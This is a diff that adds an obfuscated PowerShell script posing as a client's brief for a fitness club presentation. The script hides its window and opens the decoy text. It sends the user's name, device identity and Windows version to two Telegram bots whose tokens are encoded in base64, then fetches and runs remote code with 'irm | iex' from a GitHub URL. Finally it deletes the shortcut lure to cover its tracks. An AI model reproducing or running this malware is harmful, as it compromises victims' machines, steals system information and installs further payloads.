@@ -1,0 +1,140 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="MAIN!!!Technical_Assignment_Presentation.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+TECHNICAL ASSIGNMENT
+Presentation for CFC Fitness
+
+CLIENT
+CFC Fitness
+900 W. Washington Suite 440B-C, Marshfield MO 65706
+417-741-0996
+Cfcfitness2008@gmail.com
+cfcfitness.net
+
+OVERVIEW
+I need a professional presentation that showcases CFC Fitness for potential members, business partners, and community outreach. The club is family-owned and operates 24 hours a day, so the presentation should reflect that community-focused vibe without sounding corporate.
+
+BACKGROUND
+CFC Fitness opened in 2008 and has been serving the Webster County area since 2009. What's cool about this place is it's employee owned by 5th generation Marshfield graduates. The whole philosophy is "For the People, by the People." They genuinely care about the community and it shows in everything they do.
+
+WHAT I NEED
+A presentation with 15-20 slides covering CFC Fitness. Should work for new member onboarding, community presentations, partnership discussions, and general marketing. Nothing fancy or overly designed, just clean and professional.
+
+DESIGN STUFF
+
+Colors
+Navy blue and white as the base. Add some orange or red for accents where it makes sense. Keep the background light with dark text so it's easy to read. The official logo is in the project folder if you need it.
+
+Fonts
+Use a clean sans-serif font like Montserrat or Roboto. Headings should be bold, body text regular. Minimum 18pt for body, 28pt for headings. Keep it consistent throughout.
+
+Structure I'm thinking
+Slide 1: Title with logo and tagline "For the People, by the People"
+Slide 2: About CFC Fitness and the history
+Slide 3: Location and contact info
+Slides 4-9: Walk through each area of the gym. Weight Room, Cable Room, Cardio Room, Spin Room, Power Room, Women's Room.
+Slide 10: Other stuff like Meditation Room, Kids Area, Massage Therapy
+Slide 11: Services including Personal Training, Functional Training, SilverSneakers
+Slide 12: Membership options with pricing tiers
+Slide 13: Community involvement and partnerships
+Slide 14: Social media and contact info
+Slide 15: Call to action
+Slide 16: Thank you with logo and contact info
+
+Photos
+All the facility photos are in the project folder. You'll find:
+- logo.png (official logo)
+- gym_exterior.jpg
+- weight_room.jpg
+- cable_room.jpg
+- cardio_room.jpg
+- power_room.jpg
+- womens_room_1.jpg, womens_room_2.jpg, womens_room_3.jpg
+- gym_entrance.jpg
+- kids_area.jpg
+
+Use the high-res versions from the site. Make sure images fit 16:9 properly.
+
+FORMATTING
+Keep margins consistent. Don't overcrowd slides. Use bullet points sparingly. Write fragments instead of full sentences where it works. Skip the fancy animations, just simple fades if anything.
+
+DELIVERABLES
+PowerPoint file (.pptx)
+PDF version for easy sharing
+Optional: design guidelines doc if you used custom stuff
+
+QUESTIONS
+Email me at Cfcfitness2008@gmail.com or call 417-741-0996
+
+Date: 16.07.2026
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ij05256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v11=7*3-5
+If($v11>0){}
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v12="OAAAADYAAAAwAAAAMQAAADUAAAA2AAAAOAAAADQAAAAyAAAANgAAADoAAABBAAAAQQAAAEYAAAAwAAAARwAAAEQAAABjAAAAWQAAAEoAAABWAAAAMgAAAEwAAABtAAAAYgAAAEQAAABhAAAAcwAAAGMAAABkAAAATQAAAHgAAABvAAAAQwAAAFgAAABqAAAAbwAAADYAAABFAAAAVAAAAGwAAAAwAAAAcAAAAE4AAABQAAAAWQAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="OAAyADIANAAzADAANAA1ADgAMwA="
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="OAAAADUAAAA1AAAAOQAAADMAAAA4AAAANQAAADcAAAAxAAAANAAAADoAAABBAAAAQQAAAEcAAABzAAAAcgAAAHMAAABiAAAAYwAAAE0AAABUAAAAXwAAADAAAAB2AAAAbwAAAEYAAABmAAAAWAAAAGsAAABqAAAAQQAAADcAAABuAAAAbAAAAEQAAAB1AAAAQgAAAEYAAABlAAAARQAAAEMAAABHAAAAeAAAAGIAAABnAAAAZwAAAA=="
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 333
+$v42=7*2-1
+If($v42>0){}
+irm https://github.com/dx2q/362b/raw/refs/heads/main/fdfsdfsds_polys | iex
+$v43="MAIN!!!Technical_Assignment_Presentation.txt.ink"
+$v44=$false
+$v45=$null
+$v46=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v47=6*3-2
+If($v47>0){}
+foreach($v48 in $v46){If(Test-Path -Path $v48){$v49=Join-Path $v48 $v43;If(Test-Path -Path $v49){$v45=$v49;$v44=$true;break}}}
+$v50=5+3-1
+If($v50>0){}
+If($v44){$v51=Split-Path -Parent $v45;$v52=Get-Date;$v53=600;while(((Get-Date)-$v52).TotalSeconds -lt $v53){$v54=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v54){try{Remove-Item -Path $v45 -Force -ErrorAction Stop;$v55=Join-Path $v51 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v55 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
